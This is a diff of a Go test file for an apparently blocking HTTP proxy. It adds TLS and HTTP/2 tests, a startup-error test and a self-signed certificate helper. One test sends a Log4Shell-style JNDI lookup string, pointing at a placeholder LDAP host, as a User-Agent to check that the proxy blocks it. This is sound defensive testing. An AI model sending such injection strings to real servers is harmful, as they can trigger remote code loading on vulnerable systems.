@@ -3,8 +3,16 @@ package main
 import (
 	"bytes"
 	"context"
+	"crypto/ecdsa"
+	"crypto/elliptic"
+	"crypto/rand"
+	"crypto/tls"
+	"crypto/x509"
+	"crypto/x509/pkix"
 	"encoding/json"
+	"encoding/pem"
 	"io"
+	"math/big"
 	"net"
 	"net/http"
 	"net/http/httptest"
@@ -329,4 +337,95 @@ func TestRepeatableFlagsReachTheProxy(t *testing.T) {
 	if code != 0 || !strings.Contains(out, `"image/"`) || !strings.Contains(out, `"video/"`) || !strings.Contains(out, `"LSH-2001"`) {
 		t.Errorf("exit %d\n%s\n%s", code, out, errs)
 	}
+}
+
+// The binary serves HTTPS and HTTP/2 when given a certificate, and refuses bad TLS settings.
+func TestRunServesTLS(t *testing.T) {
+	dir := t.TempDir()
+	certFile, keyFile, pool := testCert(t, dir)
+	up := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, _ *http.Request) { _, _ = io.WriteString(w, "backend") }))
+	defer up.Close()
+
+	ctx, cancel := context.WithCancel(context.Background())
+	defer cancel()
+	addrc := make(chan string, 1)
+	errb := &syncBuffer{}
+	done := make(chan int, 1)
+	go func() {
+		done <- run(ctx, []string{"-listen", "127.0.0.1:0", "-upstream", up.URL, "-mode", "block", "-tls-cert", certFile, "-tls-key", keyFile, "-tls-min-version", "1.3"},
+			io.Discard, errb, func(a string) { addrc <- a })
+	}()
+	addr := <-addrc
+
+	client := &http.Client{Timeout: 5 * time.Second, Transport: &http.Transport{
+		ForceAttemptHTTP2: true,
+		TLSClientConfig:   &tls.Config{RootCAs: pool, ServerName: "localhost", MinVersion: tls.VersionTLS13},
+	}}
+	get := func(ua string) (int, string) {
+		req, _ := http.NewRequestWithContext(context.Background(), http.MethodGet, "https://"+addr+"/", nil)
+		req.Header.Set("User-Agent", ua)
+		resp, err := client.Do(req)
+		if err != nil {
+			t.Fatal(err)
+		}
+		defer func() { _ = resp.Body.Close() }()
+		return resp.StatusCode, resp.Proto
+	}
+	if code, proto := get("curl/8"); code != 200 || proto != "HTTP/2.0" {
+		t.Errorf("clean: %d %s", code, proto)
+	}
+	if code, _ := get("${jndi:ldap://x.invalid/a}"); code != 403 {
+		t.Errorf("attack: %d", code)
+	}
+	// Plain HTTP to the TLS port must not work.
+	if resp, err := http.Get("http://" + addr + "/"); err == nil { //nolint:noctx // deliberately a plain request to a TLS port
+		_ = resp.Body.Close()
+		if resp.StatusCode == http.StatusOK {
+			t.Error("plain HTTP was served on the TLS port")
+		}
+	}
+	cancel()
+	if code := <-done; code != 0 {
+		t.Errorf("exit %d: %s", code, errb.String())
+	}
+	if !strings.Contains(errb.String(), `"tls":true`) {
+		t.Errorf("startup log does not say TLS is on:\n%s", errb.String())
+	}
+}
+
+func TestBadTLSSettingsFailAtStartup(t *testing.T) {
+	code, _, errs := runOnce(t, "-upstream", "http://x", "-tls-cert", "/nonexistent.crt", "-tls-key", "/nonexistent.key")
+	if code != 2 || !strings.Contains(errs, "tls certificate") {
+		t.Errorf("exit %d: %s", code, errs)
+	}
+	code, _, errs = runOnce(t, "-upstream", "http://x", "-tls-cert", "only.crt")
+	if code != 2 || !strings.Contains(errs, "together") {
+		t.Errorf("exit %d: %s", code, errs)
+	}
+}
+
+func testCert(t *testing.T, dir string) (certFile, keyFile string, pool *x509.CertPool) {
+	t.Helper()
+	key, err := ecdsa.GenerateKey(elliptic.P256(), rand.Reader)
+	if err != nil {
+		t.Fatal(err)
+	}
+	tmpl := &x509.Certificate{
+		SerialNumber: big.NewInt(1), Subject: pkix.Name{CommonName: "localhost"},
+		NotBefore: time.Now().Add(-time.Hour), NotAfter: time.Now().Add(time.Hour),
+		KeyUsage: x509.KeyUsageDigitalSignature, ExtKeyUsage: []x509.ExtKeyUsage{x509.ExtKeyUsageServerAuth},
+		IPAddresses: []net.IP{net.IPv4(127, 0, 0, 1)}, DNSNames: []string{"localhost"},
+	}
+	der, err := x509.CreateCertificate(rand.Reader, tmpl, tmpl, &key.PublicKey, key)
+	if err != nil {
+		t.Fatal(err)
+	}
+	keyDER, _ := x509.MarshalECPrivateKey(key)
+	certFile, keyFile = filepath.Join(dir, "c.crt"), filepath.Join(dir, "c.key")
+	_ = os.WriteFile(certFile, pem.EncodeToMemory(&pem.Block{Type: "CERTIFICATE", Bytes: der}), 0o600)
+	_ = os.WriteFile(keyFile, pem.EncodeToMemory(&pem.Block{Type: "EC PRIVATE KEY", Bytes: keyDER}), 0o600)
+	cert, _ := x509.ParseCertificate(der)
+	pool = x509.NewCertPool()
+	pool.AddCert(cert)
+	return certFile, keyFile, pool
 }
